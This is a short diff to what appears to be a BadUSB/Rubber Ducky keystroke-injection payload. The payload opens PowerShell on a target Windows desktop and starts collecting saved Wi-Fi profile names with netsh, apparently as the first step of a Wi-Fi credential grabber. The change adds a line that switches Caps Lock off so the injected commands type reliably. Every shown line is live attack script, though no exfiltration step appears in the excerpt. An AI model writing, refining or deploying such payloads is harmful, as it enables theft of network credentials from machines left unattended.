@@ -9,6 +9,9 @@ STRING cd "%USERPROFILE%\Desktop"
 ENTER
 STRING powershell
 ENTER
+REM Turn off the Caps Lock if it is ON
+STRING if ([console]::capslock -eq $true) {$wsh = new-object -comobject wscript.shell; $wsh.sendkeys('{capslock}')}
+ENTER
 STRING $Profiles=@()
 ENTER
 STRING $Profiles +=(netsh wlan show profiles) | Select-String "\:(.+)$" | Foreach{$_.Matches.Groups[1].Value.Trim()}
